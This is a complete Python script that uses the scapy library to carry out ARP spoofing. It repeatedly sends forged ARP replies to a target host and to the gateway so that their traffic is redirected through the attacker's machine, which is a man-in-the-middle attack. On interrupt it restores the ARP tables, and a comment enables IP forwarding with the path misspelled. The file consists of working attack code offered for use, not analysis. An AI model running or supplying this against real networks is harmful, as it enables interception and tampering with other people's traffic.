# usr/bin/python3
# echo 1 > /proc/sys/net/ipn4/ip_forward
import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(detination_ip, source_ip):
    destination_mac = get_mac(detination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=detination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


sent_packets_count = 0

target_ip = ""  # enter the target ip
gateway_ip = ""  # enter the router ip

try:
    while True:
        spoof(target_ip, gateway_ip)  # upside down
        spoof(gateway_ip, target_ip)  # upside down
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets Send > " + str(sent_packets_count), end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] You Pressed CTRL + C ....... Resetting ARP tables............ Please Wait. \n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)


